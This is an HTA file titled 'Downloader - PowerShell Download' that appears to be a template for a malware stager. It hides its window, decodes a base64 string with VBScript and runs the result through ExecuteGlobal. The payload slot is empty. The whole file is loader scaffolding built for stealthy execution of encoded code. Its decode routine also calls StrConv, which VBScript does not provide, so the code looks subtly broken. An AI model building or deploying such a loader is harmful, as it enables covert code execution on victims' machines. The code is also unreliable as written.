<html>
<head>
  <title>Downloader - PowerShell Download</title>
  <HTA:APPLICATION
    ID="app"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
  >
  <script language="VBScript">
    Dim encoded
    encoded = ""

    Function DecodeBase64(byVal str)
      Dim xml, node
      Set xml = CreateObject("MSXML2.DOMDocument.3.0")
      Set node = xml.CreateElement("b64")
      node.dataType = "bin.base64"
      node.text = str
      DecodeBase64 = node.nodeTypedValue
      DecodeBase64 = StrConv(DecodeBase64, vbUnicode)
    End Function

    ExecuteGlobal DecodeBase64(encoded)
  </script>
</head>
<body>
</body>
</html>
